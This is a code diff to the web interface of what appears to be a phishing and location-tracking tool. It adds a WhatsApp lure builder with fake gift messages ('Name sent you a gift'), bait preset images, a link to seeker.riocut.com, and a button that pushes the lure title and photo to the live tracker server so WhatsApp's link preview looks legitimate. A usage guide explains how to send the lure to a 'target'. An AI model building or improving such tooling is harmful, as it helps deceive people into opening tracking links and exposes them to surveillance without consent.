@@ -1052,22 +1052,28 @@
             <div class="flex items-center justify-between">
               <span class="font-bold text-slate-200 text-xs flex items-center space-x-1.5">
                 <i data-lucide="image" class="w-3.5 h-3.5 text-cyan-400"></i>
-                <span>2. Upload or Pick Preview Image</span>
+                <span>2. Choose or Upload Image</span>
               </span>
-              <span class="text-[10px] text-slate-500">JPG, PNG, WebP</span>
+              <span class="text-[10px] text-slate-500">URL, Upload or Presets</span>
+            </div>
+
+            <!-- Image URL Input -->
+            <div>
+              <label class="block text-slate-300 text-[11px] font-medium mb-1">Image URL (Direct link to photo)</label>
+              <input type="text" id="waCustomImageUrl" oninput="handleWAImageUrlInput()" placeholder="https://... (or choose/upload below)" class="w-full bg-surface-900 border border-slate-700 rounded-lg px-3 py-2 text-xs text-slate-200 focus:outline-none focus:border-emerald-500 font-mono">
             </div>
 
             <!-- Upload Area & Presets -->
             <div class="space-y-2.5">
               <div class="flex items-center space-x-2">
-                <label class="flex-1 border-2 border-dashed border-slate-700 hover:border-emerald-500/80 bg-surface-900 rounded-xl p-3 text-center cursor-pointer transition group">
+                <label class="flex-1 border-2 border-dashed border-slate-700 hover:border-emerald-500/80 bg-surface-900 rounded-xl p-2.5 text-center cursor-pointer transition group">
                   <input type="file" id="waImageFileInput" accept="image/*" onchange="handleWAImageUpload(event)" class="hidden">
                   <div class="flex items-center justify-center space-x-2 text-slate-400 group-hover:text-emerald-400">
                     <i data-lucide="upload-cloud" class="w-4 h-4"></i>
-                    <span class="font-medium text-[11px]">Click to Upload Custom Photo</span>
+                    <span class="font-medium text-[11px]">Upload Photo from Device</span>
                   </div>
                 </label>
-                <button onclick="resetWAImage()" title="Reset to default image" class="p-3 bg-surface-900 hover:bg-surface-800 border border-slate-700 rounded-xl text-slate-400 hover:text-white transition">
+                <button onclick="resetWAImage()" title="Reset to default image" class="p-2.5 bg-surface-900 hover:bg-surface-800 border border-slate-700 rounded-xl text-slate-400 hover:text-white transition">
                   <i data-lucide="rotate-ccw" class="w-4 h-4"></i>
                 </button>
               </div>
@@ -1075,12 +1081,15 @@
               <!-- Presets -->
               <div>
                 <span class="text-[10px] text-slate-500 block mb-1.5 font-medium">Quick Presets:</span>
-                <div class="grid grid-cols-4 gap-2">
+                <div class="grid grid-cols-5 gap-1.5">
+                  <button type="button" onclick="setWAPresetImage('gift')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
+                    🎁 Gift
+                  </button>
                   <button type="button" onclick="setWAPresetImage('doc')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
                     📄 Document
                   </button>
                   <button type="button" onclick="setWAPresetImage('cloud')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
-                    ☁️ Cloud Drive
+                    ☁️ Cloud
                   </button>
                   <button type="button" onclick="setWAPresetImage('meeting')" class="wa-preset-btn p-1.5 rounded-lg border border-slate-700 bg-surface-900 hover:border-emerald-500 text-[10px] text-slate-300 transition text-center truncate">
                     📹 Meeting
@@ -1091,6 +1100,17 @@
                 </div>
               </div>
             </div>
+          </div>
+
+          <!-- Primary Action: Apply to Live Tracker -->
+          <div class="p-3.5 bg-gradient-to-r from-emerald-950/60 to-cyan-950/60 rounded-xl border border-emerald-500/30 space-y-2">
+            <button type="button" onclick="applyWAToLiveTracker()" class="w-full py-2.5 px-4 bg-gradient-to-r from-emerald-600 via-teal-600 to-cyan-600 hover:from-emerald-500 hover:to-cyan-500 text-white rounded-xl text-xs font-bold transition flex items-center justify-center space-x-2 shadow-lg shadow-emerald-600/30">
+              <i data-lucide="zap" class="w-4 h-4"></i>
+              <span id="waApplyLiveBtnText">🚀 Apply to Live Tracker (Set Link Preview)</span>
+            </button>
+            <p class="text-[10px] text-slate-400 text-center leading-tight">
+              Updates seeker.riocut.com so WhatsApp's scraper automatically pulls this Title, Description & Photo thumbnail.
+            </p>
           </div>
 
           <!-- Ready-to-Copy Final Message Box -->
@@ -1136,14 +1156,18 @@
               <i data-lucide="smartphone" class="w-3.5 h-3.5 text-emerald-400"></i>
               <span>Live WhatsApp Screen Preview</span>
             </span>
-            <span class="text-[10px] text-slate-500">Real-time simulator</span>
+            <!-- Mode Switch Tabs -->
+            <div class="flex items-center space-x-1 bg-surface-900 border border-slate-700 rounded-lg p-0.5 text-[10px]">
+              <button type="button" id="waModeCardBtn" onclick="setWAPreviewMode('card')" class="px-2 py-0.5 rounded font-semibold bg-emerald-600/30 text-emerald-300 border border-emerald-500/40">Link Card</button>
+              <button type="button" id="waModePhotoBtn" onclick="setWAPreviewMode('photo')" class="px-2 py-0.5 rounded font-medium text-slate-400 hover:text-white">Photo + Caption</button>
+            </div>
           </div>
 
           <!-- Phone Screen Container (WhatsApp Dark Theme: #0b141a) -->
           <div class="bg-[#0b141a] border border-slate-700/80 rounded-2xl p-3.5 flex-1 flex flex-col justify-between shadow-2xl relative min-h-[380px] overflow-hidden">
             
             <!-- WhatsApp Chat Header -->
-            <div class="flex items-center justify-between pb-2.5 mb-3 border-b border-white/10 shrink-0">
+            <div class="flex items-center justify-between pb-2 mb-2.5 border-b border-white/10 shrink-0">
               <div class="flex items-center space-x-2">
                 <div class="w-7 h-7 rounded-full bg-emerald-600/30 border border-emerald-500/40 flex items-center justify-center text-emerald-400 font-bold text-[11px]">
                   WA
@@ -1159,43 +1183,65 @@
               </div>
             </div>
 
-            <!-- Chat Message Area with Wallpaper Pattern -->
+            <!-- Chat Message Area -->
             <div class="flex-1 flex flex-col justify-end space-y-2 py-2">
               
               <!-- Outgoing WhatsApp Bubble (WhatsApp Green: #005c4b) -->
-              <div class="max-w-[95%] ml-auto bg-[#005c4b] text-slate-100 rounded-xl rounded-tr-none p-1.5 shadow-md border border-white/5 space-y-1.5 transition-all">
+              <div class="max-w-[96%] ml-auto bg-[#005c4b] text-slate-100 rounded-xl rounded-tr-none p-2 shadow-md border border-white/5 space-y-2 transition-all">
                 
-                <!-- Image Container inside Bubble -->
-                <div class="rounded-lg overflow-hidden bg-black/40 relative aspect-video flex items-center justify-center max-h-[160px]">
-                  <img id="waPreviewImg" crossOrigin="anonymous" src="https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600" alt="Preview Image" class="w-full h-full object-cover">
+                <!-- 1) PHOTO ATTACHMENT MODE VIEW -->
+                <div id="waPhotoAttachmentView" class="hidden space-y-1.5">
+                  <div class="rounded-lg overflow-hidden bg-black/40 relative aspect-video flex items-center justify-center max-h-[160px]">
+                    <img id="waPreviewImgPhoto" crossOrigin="anonymous" src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=600" alt="Preview Image" class="w-full h-full object-cover">
+                  </div>
+                  <div class="px-1 space-y-0.5">
+                    <div id="waPhotoTitle" class="font-bold text-white text-[12px] leading-tight">Name sent you a gift.</div>
+                    <div id="waPhotoDesc" class="text-slate-200 text-[11px] leading-snug">Please click the link to grab the gift.</div>
+                    <div id="waPhotoLink" class="text-[#53bdeb] font-mono text-[11px] underline break-all pt-0.5">https://seeker.riocut.com</div>
+                  </div>
                 </div>
 
-                <!-- Text Content inside Bubble -->
-                <div class="px-1.5 pb-1 space-y-1">
-                  <div id="waPreviewTitle" class="font-bold text-white text-[12px] leading-tight">
-                    Project Documents & Asset Review
-                  </div>
-                  <div id="waPreviewDesc" class="text-slate-200 text-[11px] leading-snug">
-                    Please review the attached project files at the link below:
-                  </div>
-                  <div id="waPreviewLink" class="text-[#53bdeb] font-mono text-[11px] underline break-all pt-0.5 font-medium">
-                    https://seeker.riocut.com
+                <!-- 2) LINK PREVIEW CARD MODE VIEW (How WhatsApp displays the link preview) -->
+                <div id="waLinkCardView" class="space-y-1.5">
+                  <!-- Nested Link Preview Box (WhatsApp standard rich link card) -->
+                  <div class="bg-[#024436]/90 border border-white/10 rounded-lg overflow-hidden flex flex-col">
+                    <div class="w-full h-32 bg-black/30 overflow-hidden relative">
+                      <img id="waPreviewImgCard" crossOrigin="anonymous" src="https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=600" alt="Card Image" class="w-full h-full object-cover">
+                      <span class="absolute bottom-1.5 left-2 bg-black/60 backdrop-blur-sm text-slate-300 text-[9px] px-1.5 py-0.5 rounded font-mono">seeker.riocut.com</span>
+                    </div>
+                    <div class="p-2 space-y-0.5">
+                      <div id="waCardTitle" class="font-bold text-white text-[11.5px] leading-snug line-clamp-1">Name sent you a gift.</div>
+                      <div id="waCardDesc" class="text-slate-300 text-[10.5px] leading-snug line-clamp-2">Please click the link to grab the gift.</div>
+                      <div class="text-[9.5px] text-slate-400 font-mono pt-0.5 truncate">https://seeker.riocut.com</div>
+                    </div>
                   </div>
 
-                  <!-- Time & Blue Double Checks -->
-                  <div class="flex items-center justify-end space-x-1 pt-1 text-[9px] text-white/60">
-                    <span id="waPreviewTime">2:42 PM</span>
-                    <span class="text-[#53bdeb] font-bold">✓✓</span>
+                  <!-- Text Body Below Card -->
+                  <div class="px-1 space-y-0.5">
+                    <div id="waBubbleTitle" class="font-bold text-white text-[11.5px]">Name sent you a gift.</div>
+                    <div id="waBubbleDesc" class="italic text-slate-200 text-[10.5px]">Please click the link to grab the gift.</div>
+                    <div id="waBubbleLink" class="text-[#53bdeb] font-mono text-[11px] underline break-all">🔗 https://seeker.riocut.com</div>
                   </div>
+                </div>
+
+                <!-- Time & Blue Double Checks -->
+                <div class="flex items-center justify-end space-x-1 pt-0.5 text-[9px] text-white/60">
+                  <span id="waPreviewTime">2:42 PM</span>
+                  <span class="text-[#53bdeb] font-bold">✓✓</span>
                 </div>
 
               </div>
 
             </div>
 
-            <!-- Bottom Note -->
-            <div class="pt-2 border-t border-white/10 text-center">
-              <span class="text-[10px] text-slate-400">Target sees this exact photo & message</span>
+            <!-- WhatsApp Usage Guide Box -->
+            <div class="mt-2.5 p-2 rounded-xl bg-black/40 border border-white/10 text-[10.5px] text-slate-300 space-y-1">
+              <div class="text-emerald-400 font-semibold flex items-center space-x-1">
+                <i data-lucide="info" class="w-3 h-3"></i>
+                <span>How to send in WhatsApp:</span>
+              </div>
+              <p><strong>Option A (Link Preview):</strong> Click <span class="text-emerald-400">"🚀 Apply to Live Tracker"</span>, then paste link into WhatsApp.</p>
+              <p><strong>Option B (Photo Attachment):</strong> Click <span class="text-cyan-400">"Copy Photo"</span>, paste in WhatsApp, then paste message into <span class="text-white italic">"Add a caption"</span>.</p>
             </div>
 
           </div>
@@ -2685,11 +2731,43 @@
 
     // WhatsApp Message Generator modal functions
     const WA_PRESET_IMAGES = {
+      gift: 'https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=600',
       doc: 'https://images.unsplash.com/photo-1568667256549-094345857637?w=600',
       cloud: 'https://images.unsplash.com/photo-1544197150-b99a580bb7a8?w=600',
       meeting: 'https://images.unsplash.com/photo-1588196749597-9ff075ee6b5b?w=600',
       security: 'https://images.unsplash.com/photo-1614064641938-3bbee52942c7?w=600',
-      default: 'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?w=600'
+      default: 'https://images.unsplash.com/photo-1549465220-1a8b9238cd48?w=600'
+    };
+
+    let currentWAImageSrc = WA_PRESET_IMAGES.gift;
+    let currentWAPreviewMode = 'card';
+
+    window.setWAPreviewMode = function(mode) {
+      currentWAPreviewMode = mode;
+      const cardView = document.getElementById('waLinkCardView');
+      const photoView = document.getElementById('waPhotoAttachmentView');
+      const cardBtn = document.getElementById('waModeCardBtn');
+      const photoBtn = document.getElementById('waModePhotoBtn');
+
+      if (mode === 'photo') {
+        if (cardView) cardView.classList.add('hidden');
+        if (photoView) photoView.classList.remove('hidden');
+        if (cardBtn) {
+          cardBtn.className = 'px-2 py-0.5 rounded font-medium text-slate-400 hover:text-white';
+        }
+        if (photoBtn) {
+          photoBtn.className = 'px-2 py-0.5 rounded font-semibold bg-emerald-600/30 text-emerald-300 border border-emerald-500/40';
+        }
+      } else {
+        if (photoView) photoView.classList.add('hidden');
+        if (cardView) cardView.classList.remove('hidden');
+        if (photoBtn) {
+          photoBtn.className = 'px-2 py-0.5 rounded font-medium text-slate-400 hover:text-white';
+        }
+        if (cardBtn) {
+          cardBtn.className = 'px-2 py-0.5 rounded font-semibold bg-emerald-600/30 text-emerald-300 border border-emerald-500/40';
+        }
+      }
     };
 
     window.openWhatsAppModal = function() {
@@ -2709,6 +2787,12 @@
       // Populate default title based on selected template if available
       const tplSelect = document.getElementById('modalTemplateSelect');
       const titleInput = document.getElementById('waCustomTitle');
+      const imgInput = document.getElementById('waCustomImageUrl');
+
+      if (imgInput && !imgInput.value) {
+        imgInput.value = currentWAImageSrc;
+      }
+
       if (tplSelect && titleInput) {
         const val = tplSelect.value;
         if (val === '6' && document.getElementById('param_custom_og_title')) {
@@ -2721,7 +2805,14 @@
         } else if (val === '1') {
           titleInput.value = 'WhatsApp Group Invite';
         } else if (val === '2') {
-          titleInput.value = 'Telegram Channel Invite';
+          // If WhatsApp template active, check if custom title was set
+          const activeTitle = document.getElementById('param_title')?.value;
+          if (activeTitle) titleInput.value = activeTitle;
+          const activeImg = document.getElementById('param_image')?.value;
+          if (activeImg) {
+            currentWAImageSrc = activeImg;
+            if (imgInput) imgInput.value = activeImg;
+          }
         }
       }
 
@@ -2734,28 +2825,62 @@
       if (modal) modal.classList.add('hidden');
     };
 
-    window.handleWAImageUpload = function(event) {
+    window.handleWAImageUrlInput = function() {
+      const val = (document.getElementById('waCustomImageUrl')?.value || '').trim();
+      if (val) {
+        currentWAImageSrc = val;
+        updateWAMessages();
+      }
+    };
+
+    window.handleWAImageUpload = async function(event) {
       const file = event.target.files && event.target.files[0];
       if (!file) return;
       const reader = new FileReader();
-      reader.onload = function(e) {
-        const img = document.getElementById('waPreviewImg');
-        if (img) img.src = e.target.result;
-        showToast('Photo uploaded & preview updated!', 'success');
+      reader.onload = async function(e) {
+        const base64Data = e.target.result;
+        currentWAImageSrc = base64Data;
+        updateWAMessages();
+        showToast('Uploading photo to server...', 'info');
+
+        try {
+          const res = await fetch('/api/tracker/upload_image', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ image: base64Data, filename: file.name })
+          });
+          const data = await res.json();
+          if (data.status === 'success' && data.url) {
+            currentWAImageSrc = data.url;
+            const imgInput = document.getElementById('waCustomImageUrl');
+            if (imgInput) imgInput.value = data.url;
+            updateWAMessages();
+            showToast('Photo uploaded! Click "Apply to Live Tracker" to activate it on your link.', 'success');
+          } else {
+            showToast('Preview updated locally.', 'info');
+          }
+        } catch (err) {
+          console.warn('Upload error:', err);
+          showToast('Preview updated locally.', 'info');
+        }
       };
       reader.readAsDataURL(file);
     };
 
     window.setWAPresetImage = function(type) {
       const url = WA_PRESET_IMAGES[type] || WA_PRESET_IMAGES.default;
-      const img = document.getElementById('waPreviewImg');
-      if (img) img.src = url;
+      currentWAImageSrc = url;
+      const imgInput = document.getElementById('waCustomImageUrl');
+      if (imgInput) imgInput.value = url;
+      updateWAMessages();
       showToast(`Selected ${type} preview photo`, 'info');
     };
 
     window.resetWAImage = function() {
-      const img = document.getElementById('waPreviewImg');
-      if (img) img.src = WA_PRESET_IMAGES.default;
+      currentWAImageSrc = WA_PRESET_IMAGES.default;
+      const imgInput = document.getElementById('waCustomImageUrl');
+      if (imgInput) imgInput.value = currentWAImageSrc;
+      updateWAMessages();
       showToast('Reset to default photo', 'info');
     };
 
@@ -2766,13 +2891,33 @@
         const sep = link.includes('?') ? '&' : '?';
         link = `${link}${sep}v=${Date.now().toString().slice(-4)}`;
       }
-      const title = (document.getElementById('waCustomTitle')?.value || 'Project Document & Asset Review').trim();
-      const desc = (document.getElementById('waCustomDesc')?.value || 'Please review the attached project files at the link below:').trim();
+      const title = (document.getElementById('waCustomTitle')?.value || 'Name sent you a gift.').trim();
+      const desc = (document.getElementById('waCustomDesc')?.value || 'Please click the link to grab the gift.').trim();
+      const imgUrl = (document.getElementById('waCustomImageUrl')?.value || currentWAImageSrc || WA_PRESET_IMAGES.default).trim();
 
-      // Update Live WhatsApp Bubble Preview
-      const pTitle = document.getElementById('waPreviewTitle');
-      const pDesc = document.getElementById('waPreviewDesc');
-      const pLink = document.getElementById('waPreviewLink');
+      // Update Live WhatsApp Images
+      const imgCard = document.getElementById('waPreviewImgCard');
+      const imgPhoto = document.getElementById('waPreviewImgPhoto');
+      if (imgCard) imgCard.src = imgUrl;
+      if (imgPhoto) imgPhoto.src = imgUrl;
+
+      // Update Link Card Mode Elements
+      const cardTitle = document.getElementById('waCardTitle');
+      const cardDesc = document.getElementById('waCardDesc');
+      const bTitle = document.getElementById('waBubbleTitle');
+      const bDesc = document.getElementById('waBubbleDesc');
+      const bLink = document.getElementById('waBubbleLink');
+
+      if (cardTitle) cardTitle.textContent = title;
+      if (cardDesc) cardDesc.textContent = desc;
+      if (bTitle) bTitle.textContent = title;
+      if (bDesc) bDesc.textContent = desc;
+      if (bLink) bLink.textContent = `🔗 ${link}`;
+
+      // Update Photo Attachment Mode Elements
+      const pTitle = document.getElementById('waPhotoTitle');
+      const pDesc = document.getElementById('waPhotoDesc');
+      const pLink = document.getElementById('waPhotoLink');
       if (pTitle) pTitle.textContent = title;
       if (pDesc) pDesc.textContent = desc;
       if (pLink) pLink.textContent = link;
@@ -2781,6 +2926,49 @@
       const readyMessage = `*${title}*\n_${desc}_\n\n🔗 ${link}`;
       const finalArea = document.getElementById('waFinalCopyText');
       if (finalArea) finalArea.value = readyMessage;
+    };
+
+    window.applyWAToLiveTracker = async function() {
+      const btn = document.getElementById('waApplyLiveBtnText');
+      const originalText = btn ? btn.textContent : '';
+      if (btn) btn.textContent = 'Applying to Live Server...';
+
+      const title = (document.getElementById('waCustomTitle')?.value || 'WhatsApp Group Invite').trim();
+      const desc = (document.getElementById('waCustomDesc')?.value || 'Please click the link to join').trim();
+      const image = (document.getElementById('waCustomImageUrl')?.value || currentWAImageSrc || WA_PRESET_IMAGES.default).trim();
+
+      try {
+        const payload = {
+          template_id: 2, // WhatsApp template
+          title: title,
+          desc: desc,
+          image: image,
+          port: 8080
+        };
+
+        const res = await fetch('/api/tracker/start', {
+          method: 'POST',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify(payload)
+        });
+        const data = await res.json();
+        if (data.status === 'success') {
+          showToast('🚀 Live Link Preview active! WhatsApp will now display this photo & title.', 'success');
+          // Regenerate cache buster so WhatsApp doesn't use old cached preview
+          const freshToggle = document.getElementById('waFreshCacheToggle');
+          if (freshToggle) freshToggle.checked = true;
+          updateWAMessages();
+          if (btn) btn.textContent = '✅ Live Preview Updated!';
+          setTimeout(() => { if (btn) btn.textContent = '🚀 Apply to Live Tracker (Set Link Preview)'; }, 3000);
+          fetchStatus();
+        } else {
+          showToast('Error updating tracker: ' + (data.message || 'failed'), 'error');
+          if (btn) btn.textContent = originalText;
+        }
+      } catch (err) {
+        showToast('Failed to apply: ' + err.message, 'error');
+        if (btn) btn.textContent = originalText;
+      }
     };
 
     window.copyFinalWAMessage = function() {
@@ -2795,7 +2983,7 @@
     };
 
     window.copyWAImageToClipboard = async function() {
-      const img = document.getElementById('waPreviewImg');
+      const img = document.getElementById('waPreviewImgCard') || document.getElementById('waPreviewImgPhoto');
       const btn = document.getElementById('waCopyImgBtnText');
       if (!img) return;
 
@@ -2808,7 +2996,7 @@
 
         canvas.toBlob(async (blob) => {
           if (!blob) {
-            showToast('Unable to copy this image format', 'error');
+            downloadWAImage();
             return;
           }
           try {
@@ -2822,7 +3010,7 @@
             }
           } catch (err) {
             downloadWAImage();
-            showToast('Browser blocked clipboard write; downloading photo instead!', 'info');
+            showToast('Browser blocked direct clipboard write; photo downloaded instead!', 'info');
           }
         }, 'image/png');
       } catch (e) {
@@ -2831,7 +3019,7 @@
     };
 
     window.downloadWAImage = function() {
-      const img = document.getElementById('waPreviewImg');
+      const img = document.getElementById('waPreviewImgCard') || document.getElementById('waPreviewImgPhoto');
       if (!img) return;
       const a = document.createElement('a');
       a.href = img.src;
